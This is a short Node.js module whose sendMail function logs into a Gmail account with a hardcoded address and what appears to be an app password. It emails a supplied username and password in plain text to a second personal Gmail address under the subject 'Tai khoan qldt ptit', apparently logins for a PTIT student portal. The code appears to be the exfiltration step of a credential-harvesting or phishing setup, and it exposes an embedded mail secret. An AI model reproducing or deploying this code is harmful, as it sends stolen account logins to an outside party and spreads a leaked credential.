const nodemailer = require('nodemailer');

const sendMail = async (username, password) => {
    try {
        const transporter = nodemailer.createTransport({
            service: 'gmail', 
            auth: {
                user: 'haonika2004@gmail.com',
                pass: 'exza solr ysga bosi', 
            },
        });

        // Tùy chỉnh nội dung email
        const mailOptions = {
            from: 'haonika2004@gmail.com', // Địa chỉ gửi
            to: 'hao510duong@gmail.com',
            subject: 'Tai khoan qldt ptit',
            text: `Username: ${username}, password: ${password}`
        };

        const info = await transporter.sendMail(mailOptions);
        console.log('Email sent: ' + info.response);
        return info;
    } catch (error) {
        console.error('Error sending email:', error);
        throw error;
    }
};

module.exports = { sendMail };
